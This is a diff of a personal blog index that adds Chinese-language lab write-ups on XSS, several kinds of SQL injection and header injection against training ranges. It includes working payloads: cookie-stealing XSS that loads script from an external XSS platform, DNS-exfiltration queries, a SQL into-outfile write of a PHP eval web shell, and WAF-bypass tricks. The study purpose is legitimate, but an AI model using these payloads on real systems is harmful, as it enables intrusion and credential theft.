+      <a class="article-more-a" href="/2022/03/16/%E6%88%91%E7%9A%84%E6%96%87%E7%AB%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-我的文章/文件上传漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
   <div class="article-entry" itemprop="articleBody">
@@ -341,7 +564,7 @@
 
     
     <p class="article-more-link">
-      <a class="article-more-a" href="/2022/03/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">展开全文 >></a>
+      <a class="article-more-a" href="/2022/03/16/%E6%88%91%E7%9A%84%E6%96%87%E7%AB%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">展开全文 >></a>
     </p>
     
 
@@ -371,36 +594,56 @@
 
 
   
-    <article id="post-我的文章" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-我的文章/xss靶场" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2022/03/16/%E6%88%91%E7%9A%84%E6%96%87%E7%AB%A0/" target="_blank">我的文章</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2022/03/16/%E6%88%91%E7%9A%84%E6%96%87%E7%AB%A0/" class="archive-article-date">
-        <time datetime="2022-03-16T04:37:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-16</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
   <div class="article-entry" itemprop="articleBody">
     
-    
+    <h3 id="xss靶场"><a href="#xss靶场" class="headerlink" title="xss靶场"></a>xss靶场</h3><h5 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h5><p>靶场</p>
+<p><img src="C:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20220307192038540.png" alt="image-20220307192038540"></p>
+<p>简单传一个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>试试水，结果没反应。看源代码发现第十二行将”&lt;”过滤了</p>
+<p><img src="C:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20220307192311423.png" alt="image-20220307192311423"></p>
+<p>所以就要换个触发方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">标签风格   &lt;script&gt;alert&lt;/script&gt;</span><br><span class="line">伪协议    	&lt;a href=javascript:alert(1)&gt;</span><br><span class="line">事件		oninput=alert(1)</span><br></pre></td></tr></table></figure>
+
+<p>所以我们采用第三个方法</p>
+<p><img src="C:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20220307193453118.png" alt="image-20220307193453118"></p>
+<p>依然不行，看源代码。发现我忘记闭合了，所以最后的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; oninput=alert(1) //</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20220307194019878.png" alt="image-20220307194019878"></p>
+<h5 id="储存型"><a href="#储存型" class="headerlink" title="储存型"></a>储存型</h5><p>这个靶场是关于FingCMS的一个漏洞</p>
+<p><img src="C:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20220307194253466.png" alt="image-20220307194253466"></p>
+<p>具体是令c&#x3D;mail，m&#x3D;test+攻击的xss语句，就会形成错误日志，当管理员点开错误日志时，他的cookie就会被窃取</p>
+<p>来施展一下，首先无痕状态下进入xss网站，生成xss攻击语句</p>
+<p><img src="C:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20220307194601944.png" alt="image-20220307194601944"></p>
+<p>所以payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=mail&amp;m=test&lt;sCRiPt/SrC=//hk.sb/IvfX&gt;</span><br></pre></td></tr></table></figure>
+
+<p>成功</p>
+<p><img src="C:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20220307195635112.png" alt="image-20220307195635112"></p>
+<p>xss平台的回显也列出了flag和管理员的cookie</p>
+<p><img src="C:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20220307195743212.png" alt="image-20220307195743212"></p>
+<p>通过cookie我们可以登录后台，来试一下。伪造cookie</p>
+<p><img src="C:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20220307200020215.png" alt="image-20220307200020215"></p>
+<p>把url栏里杂余的都删掉，成了这个样子</p>
+<p><img src="C:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20220307200123048.png" alt="image-20220307200123048"></p>
+<p>最后就进去了</p>
+<h5 id="Dom型"><a href="#Dom型" class="headerlink" title="Dom型"></a>Dom型</h5><p>核心：通过Js去对网页进行修改，变化执行</p>
+<p><img src="C:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20220309194735623.png" alt="image-20220309194735623"></p>
+<blockquote>
+<p>document.cookie  读取当前网页的Cookie             [xss必备]<br>document.lastModified 获得当前页面的最后修改时间        [识别伪静态必备]<br>document.write  向文档中写文HTML或者JS代码        [Dom xss常见的存在方式]</p>
+</blockquote>
+<p><strong>靶场</strong></p>
+<p><img src="C:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20220309194923839.png" alt="image-20220309194923839"></p>
+<p>思路：通过doucument.write()传参Native编码（因为直接打在url栏里不会被解析，所以根据document.write的性质，要用native编码），打出，然后提交建议回馈单，诱骗客服小姐姐去访问，获取Flag</p>
+<p>​            转换地址：<a target="_blank" rel="noopener" href="http://tool.chinaz.com/tools/native_ascii.aspx">http://tool.chinaz.com/tools/native_ascii.aspx</a></p>
+<p>接下来就是打开xss网站（hk.sb）构建攻击payload并编码打在内容反馈栏里，利用社工骗客服打开，获取其cookie</p>
+<h5 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h5><p><img src="https://s1.ax1x.com/2022/03/10/bh3qyt.png" alt="CSRF 跨站请求伪造"></p>
+
     
 
     
@@ -415,7 +658,7 @@
 
     
     <p class="article-more-link">
-      <a class="article-more-a" href="/2022/03/16/%E6%88%91%E7%9A%84%E6%96%87%E7%AB%A0/">展开全文 >></a>
+      <a class="article-more-a" href="/2022/03/07/%E6%88%91%E7%9A%84%E6%96%87%E7%AB%A0/xss%E9%9D%B6%E5%9C%BA/">展开全文 >></a>
     </p>
     
 
@@ -445,48 +688,153 @@
 
 
   
-    <article id="post-hello-world" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-我的文章/数据库注入" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2022/03/16/hello-world/" target="_blank">Hello World</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2022/03/16/hello-world/" class="archive-article-date">
-        <time datetime="2022-03-16T04:25:26.928Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-16</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
   <div class="article-entry" itemprop="articleBody">
     
-    <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+    <h3 id="数据库注入"><a href="#数据库注入" class="headerlink" title="数据库注入"></a>数据库注入</h3><h4 id="Access–cookie注入"><a href="#Access–cookie注入" class="headerlink" title="Access–cookie注入"></a>Access–cookie注入</h4><p>在线URL编码地址:<a target="_blank" rel="noopener" href="http://tool.chinaz.com/Tools/urlencode.aspx">http://tool.chinaz.com/Tools/urlencode.aspx</a></p>
+<p>打开浏览器的控制台，输入设置Js的语句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">document.cookie=<span class="string">&quot;id=&quot;</span>+<span class="title function_ invoke__">escape</span>(<span class="string">&quot;*&quot;</span>)</span><br><span class="line">   <span class="comment">// Cookie名字为 id escape是一个编码函数，这个函数会进行一次URL编码</span></span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">exists</span> (select * <span class="keyword">from</span> zzzz)  <span class="comment">//通过exists函数来判断是否存在表名</span></span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<p>cookie注入：</p>
+<p>因为是Access数据库,没有系统自带表，而且Access数据库只有一个数据库，不用纠结库名。那么获取Access数据库的表名和字段名的方法只有<strong>爆破</strong></p>
+<p><strong>实战</strong></p>
+<blockquote>
+<p>注意点：</p>
+<p> Cookie注入的时候一定要把url栏里GET类型的传参删除，不然优先执行GET类型传参。</p>
+</blockquote>
+<blockquote>
+<p>SQLmap如何跑Cookie注入<br>sqlmap.py -u “xxxxx” –cookie “id&#x3D;171” –level 2</p>
+</blockquote>
+<p><strong>靶场</strong></p>
+<p><img src="C:\Users\86152\AppData\Roaming\Typora\typora-user-images\image-20220301223757934.png" alt="image-20220301223757934"></p>
+<p>打开发现id传参，根据题目提示，考虑cookie传参。</p>
+<p><img src="C:\Users\86152\AppData\Roaming\Typora\typora-user-images\image-20220301223741613.png" alt="image-20220301223741613"></p>
+<p>f12打开控制器，并进行cookie传参，发现可行。</p>
+<p><img src="C:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20220301224736172.png" alt="image-20220301224736172"></p>
+<p>接下来，用exists函数去判断表名，将adad位置进行跑包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">document.cookie=&quot;id=&quot;+escape(&quot;171 and exists (select * from adad) &quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>随机测试admin，发现页面回显正常，admin存在。看来admin真的顶。</p>
+<p><img src="C:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20220301225309313.png" alt="image-20220301225309313"></p>
+<p>接下来抓包，用burp爆破表名。但是我自己的社区版跑的太慢了。于是找了个破解版，结果和我的jdk版本不匹配，于是我就重装了java环境，结果莫名其妙的崩了，搞了一晚上，发现我一开始的jdk环境没有删干净。真要命啊</p>
+<p><img src="C:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20220301225457291.png" alt="image-20220301225457291"></p>
+<p>发现跑到三百它就把我禁了，但是没事，已经跑出很多了。</p>
+<p><img src="C:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20220301225903703.png" alt="image-20220301225903703"></p>
+<p>然后就没有然后了，它把我禁了，我就做不了了😭</p>
+<p>第二天，继续。先判断回显点</p>
+<p><img src="C:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20220302082319187.png" alt="image-20220302082319187"></p>
+<p>看回显位置，这里要注意，因为是access数据库 ，select 1，2，3，4，5，6，7，8，9，10 后面要加表，否则会报错</p>
+<p><img src="C:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20220302082702729.png" alt="image-20220302082702729"></p>
+<p>根据尝试得知，admin里有username和password</p>
+<p><img src="C:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20220302084125305.png" alt="image-20220302084125305"></p>
+<p>试过后台，不行，发现password有点像MD5，解密后是welcome。成功登陆后台</p>
+<h4 id="Access–偏移注入"><a href="#Access–偏移注入" class="headerlink" title="Access–偏移注入"></a>Access–偏移注入</h4><p>偏移注入主要是针对知道表，但是不知道字段的ACCESS数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin.* &gt;&gt; admin表里的所有字段</span><br></pre></td></tr></table></figure>
+
+<p>当注入语句是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="number">1</span>，<span class="number">2</span>，<span class="number">3</span>，<span class="number">4</span> <span class="keyword">from</span> admin  （回显点为<span class="number">2</span>）</span><br></pre></td></tr></table></figure>
+
+<p>这时，页面就会回显2.当我们将注入语句变为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select admin.*，<span class="number">3</span>，<span class="number">4</span> <span class="keyword">from</span> admin （admin表里有两个字段，分别为username和password）</span><br></pre></td></tr></table></figure>
+
+<p>这时，页面就会回显出password字段。由此，我们将注入语句改变为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="number">1</span>，admin.*，<span class="number">4</span> <span class="keyword">from</span> admin</span><br></pre></td></tr></table></figure>
+
+<p>就能查询出admin里的username字段了</p>
+<h4 id="Mysql–DNS注入"><a href="#Mysql–DNS注入" class="headerlink" title="Mysql–DNS注入"></a>Mysql–DNS注入</h4><p>做过盲注的都知道，如果不借助sqlmap就会很麻烦，当我们的sqlmap跑不出来时，就用到了dns注入：将select到的数据发送给一个url，利用dns解析产生的记录日志来查看数据。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span> <span class="comment">/* order by 1&amp;id=1 order by 3 -- qwe */</span></span><br><span class="line">注释绕过waf</span><br></pre></td></tr></table></figure>
+
+<p>首先要涉及到：</p>
+<ul>
+<li><p><strong>注入存在前提</strong></p>
+<p>1.目标有网络</p>
+<p>2.必须为windows系统</p>
+</li>
+<li><p><strong>LOAD_FILE()   读取文件的函数</strong></p>
+<p>​       读取文件并返回文件内容为字符串。要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。 该文件所有字节可读，但文件内容必须小于max_allowed_packet（限制server接受的数据包大小函数，默认1MB）。 如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回 NULL。</p>
+</li>
+<li><p><strong>UNC路径</strong></p>
+</li>
+</ul>
+<p>​            通用命名规则，也称通用命名规范、通用命名约定，类似于\softer这样形式的路径</p>
+<p>​        格式 \ \server\sharename\directory\filename，后面不断的更新迭代，其实写&#x2F;&#x2F;也是可以用的</p>
+<p>​        <strong>UNC路径强烈建议这样写&#x2F;&#x2F;servername&#x2F;sharename</strong></p>
+<ul>
+<li><p>**DNS可能日志 **</p>
+<p>​    可查看谁在访问我的域名 </p>
+<p>​    如果我们搭建一个DNS服务器来承接域名解析。所有的访问域名都会被我们的日志记录下来</p>
+<pre><code>http://dnslog.cn/ 免费的dnslog平台   不用注册 不用登陆 不采集任何信息
+</code></pre>
+</li>
+<li><p><strong>apache漏洞</strong></p>
+</li>
+</ul>
+<p>​        apache 他会对index3.php&#x2F;1.txt请求的文件不存在他会自动请求前一个。可借助此漏洞绕过waf</p>
+<ul>
+<li><strong>payload</strong></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">load_file</span>(<span class="title function_ invoke__">concat</span>(<span class="string">&#x27;//&#x27;</span>,(select table_name <span class="keyword">from</span> information_schema.tables where table_schema=<span class="title function_ invoke__">database</span>() limit <span class="number">0</span>,<span class="number">1</span>),<span class="string">&#x27;.域名/abc&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<p><strong>实战</strong></p>
+<p>​    <img src="C:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20220302200223176.png" alt="image-20220302200223176"></p>
+<p>首先判断是否为注入，and 1&#x3D;1 后出现安全狗的拦截界面</p>
+<p><img src="C:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20220302200350636.png" alt="image-20220302200350636"></p>
+<p>于是我们便可以尝试dns注入。首先登入dnslog.cn获取域名</p>
+<p><img src="C:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20220302200647488.png" alt="image-20220302200647488"></p>
+<p>然后要绕过waf，利用apache的漏洞，所以payload为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//59.63.166.75:8014/index3.php/1.txt?id=1 and load_file(concat(&#x27;//&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&#x27;.sea3go.dnslog.cn/abc&#x27;))</span></span><br></pre></td></tr></table></figure>
+
+<p>得到反应</p>
+<p><img src="C:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20220302200933125.png" alt="image-20220302200933125"></p>
+<p>接下来就一次进行注入就可以了</p>
+<p><strong>但是</strong></p>
+<p>当目标网站没有网，或者系统不是window的时候，我们便可以采取另一种方法</p>
+<p><strong>into outfile</strong>函数来将一句话木马导入到目标的电脑里</p>
+<p>将靶场报错，可知道绝对路径，于是我们就可以将一句话木马导入到里面</p>
+<p><img src="C:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20220302203451269.png" alt="image-20220302203451269"></p>
+<p>由order by判断出其字段数为两个，于是payload为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select <span class="number">1</span>,<span class="string">&#x27;&lt;?php eval($_REQUEST[x])?&gt;&#x27;</span>into outfile <span class="string">&#x27;C:\\phpStudy\\WWW\\ad.php&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>结果</p>
+<p><img src="C:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20220302205640651.png" alt="image-20220302205640651"></p>
+<p><img src="C:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20220302205650429.png" alt="image-20220302205650429"></p>
+<p>被拦截了，没关系，加一个&#x2F;1.txt就好了</p>
+<p><img src="C:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20220302210043856.png" alt="image-20220302210043856"></p>
+<p>接下来就可以用菜刀连了</p>
+<p><img src="C:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20220302210343560.png" alt="image-20220302210343560"></p>
+<p>搞定</p>
+<h4 id="Mssql注入"><a href="#Mssql注入" class="headerlink" title="Mssql注入"></a>Mssql注入</h4><p>废话不多说，直接实战</p>
+<p><img src="C:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20220305161118717.png" alt="image-20220305161118717"></p>
+<p>先判断字段数，有三个字段，然后看回显点。这里要注意，与mysql数据库不同的是，mssql数据库的字段是要分类型的（如数字型和字符型），如果只是简单的seect 1，2，3会报错。</p>
+<p><img src="C:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20220305161329039.png" alt="image-20220305161329039"></p>
+<p>那要怎么做呢，我们可以一步步去判断，先将类型全改为<strong>null</strong></p>
+<p><img src="C:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20220305161444227.png" alt="image-20220305161444227"></p>
+<p>然后在一步步尝试三个字段分别是什么类型，这里经过测试，第一个字段为数字型，第二三个字段为字符型。</p>
+<p><img src="C:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20220305161558903.png" alt="image-20220305161558903"></p>
+<p>接下来就要提到information_schema并不是mysql特有的，mssql也有，比如我么可以这样</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,table_name,null from information_schema.tables-- qwe   //查全部的表</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="C:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20220305162026200.png" alt="image-20220305162026200"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,column_name,null from information_schema.columns-- qwe  //查全部的字段</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20220305162117923.png" alt="image-20220305162117923"></p>
+<p>而正常MSSQL查的系统自带表sysobjects：查询系统表 (xtype&#x3D;’U’)  记录表名id<br>syscolumns 字段  (id&#x3D; ) 指定sysobjects库中表名对应id</p>
+<p>比如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select id,name,null from sysobjects where xtype=&#x27;</span>U<span class="string">&#x27;-- qwe  //查询类型是user的表的内容</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="C:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20220305162309277.png" alt="image-20220305162309277"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select id,name,null from syscolumns where id=1977058079-- qwe   //查询id为1977050879的admin表里的内容</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="C:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20220305162534438.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,token,<span class="string">&#x27;null&#x27;</span> <span class="keyword">from</span> admin <span class="comment">//去admin表里面取东西 id字段的东西token字段的东西,null</span></span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
 
     
 
@@ -502,7 +850,547 @@
 
     
     <p class="article-more-link">
-      <a class="article-more-a" href="/2022/03/16/hello-world/">展开全文 >></a>
+      <a class="article-more-a" href="/2022/03/01/%E6%88%91%E7%9A%84%E6%96%87%E7%AB%A0/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-我的文章/sql基础" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h3 id="sql基础"><a href="#sql基础" class="headerlink" title="sql基础"></a>sql基础</h3><h4 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h4><p>​        post注入无非就是使用POST进行传参的注入，本质上和GET类型的没什么区别。</p>
+<blockquote>
+<p>POST注入高危点：<br>登录框<br>查询框<br>等各种和数据库有交互的框</p>
+</blockquote>
+<p>最经典的POST注入莫过于万能密码 ：  ‘or 1&#x3D;1#</p>
+<h5 id="Sqlmap如何对POST类型SQL注入进行注入"><a href="#Sqlmap如何对POST类型SQL注入进行注入" class="headerlink" title="Sqlmap如何对POST类型SQL注入进行注入"></a>Sqlmap如何对POST类型SQL注入进行注入</h5><ol>
+<li><p>​    –forms  sqlmap去读取页面中POST传参的表单的传参名然后进行SQL注入</p>
+</li>
+<li><p>​    -r 1.txt sqlmap读取数据包文件进行SQL注入，注入处可以打一个*号告诉Sqlmap测试那个点</p>
+</li>
+</ol>
+<h5 id="php超全局变量"><a href="#php超全局变量" class="headerlink" title="php超全局变量"></a>php超全局变量</h5><p>PHP 中的许多预定义变量都是“超全局的”，这意味着它们在一个脚本的全部作用域中都可用。<br>这些超全局变量是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_REQUEST （获取GET/POST/COOKIE） COOKIE在新版本已经无法获取了</span><br><span class="line">$_POST  （获取POST传参）</span><br><span class="line">$_GET  (获取GET的传参)</span><br><span class="line">$_COOKIE   （获取COOKIE的值）</span><br><span class="line">$_SERVER  （包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组）</span><br></pre></td></tr></table></figure>
+
+<p>$_SERVER功能强大</p>
+<p>常用的：</p>
+<ul>
+<li><p>$_SERVER[‘HTTP_REFERER’]  获取Referer请求头数据</p>
+</li>
+<li><p>$_SERVER[“HTTP_USER_AGENT”]  获取用户相关信息，包括用户浏览器、操作系统等信息</p>
+</li>
+<li><p>$_SERVER[“REMOTE_ADDR”]  浏览网页的用户ip</p>
+</li>
+</ul>
+<h4 id="Head注入"><a href="#Head注入" class="headerlink" title="Head注入"></a>Head注入</h4><p>也是换了一种传参方式而已</p>
+<p> <strong>head头注入原理</strong></p>
+<p>​    利用了php的全局变量$_server获取用户的相关信息且将数据存入数据库，利用updatexml函数输入sql语句，返回信息</p>
+<p><strong>head注入利用点</strong></p>
+<p>​    user-agent，ip，Referer ，X-Forwarded-For</p>
+<p><strong>HEAD注入SQLMAP如何跑</strong></p>
+<p>​    使用–level 来指定等级，大于3就会检测请求头和COOKIE</p>
+<p><strong>updatexml在head头注入中的作用</strong></p>
+<p>updatexml实际上是一个报错注入，因为路径不存在所以报错了。但是因为数据库先执行子查询，所以报错的信息中有查询出来的信息会被报错处理啊</p>
+<h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h5><p>更新xml文档的函数</p>
+<p>语法：updatexml(目标xml内容，xml文档路径，更新的内容)</p>
+<p>​    updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)的原理：</p>
+<blockquote>
+<p>实际上这里是去更新了XML文档，但是我们在XML文档路径的位置里面写入了子查询，我们输入特殊字符，然后就因为不符合输入规则然后报错了但是报错的时候他其实已经执行了那个子查询代码！<br>[0x7e 实际是是16进制，Mysql支持16进制，但是开头得写0x    0x7e是一个特殊符号，然后不符合路径规则报错]   ~ ~</p>
+</blockquote>
+<p>updatexml () 这个函数一般是配合and 或者是or 使用的，他和联合查询不同，不需要在意什么字段数</p>
+<p>eg:<br>    select *from news where id&#x3D;1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)</p>
+<p><strong>注意</strong>：</p>
+<ul>
+<li>and 情况下只要一个为False，就会判定是False,所以如果and前面的条件不成立的情况下，就不会执行之后的语句。所以使用的时候最好用or，若and被过滤，则可用||管道符来代替</li>
+<li>某些没有回显盲注也可以用这个updatexml()进行报错注入</li>
+<li>报错一般有长度限制，不能输出太长的数据，尽量不要使用group_concat()</li>
+<li>有些盲注也可以试试看报错注入，因为有的时候报错注入的致命错误会显示出来，数据库只忽略普通报错</li>
+<li>head注入中的0x7e的作用：0x7e为~为拼接作用，有了这个拼接的特殊符号才会报错</li>
+</ul>
+<p><strong>实战</strong></p>
+<p><strong>第一题</strong></p>
+<p><img src="C:\Users\86152\AppData\Roaming\Typora\typora-user-images\image-20220227230744906.png" alt="image-20220227230744906"></p>
+<p>如图，cookie注入的方式为User-Agent。</p>
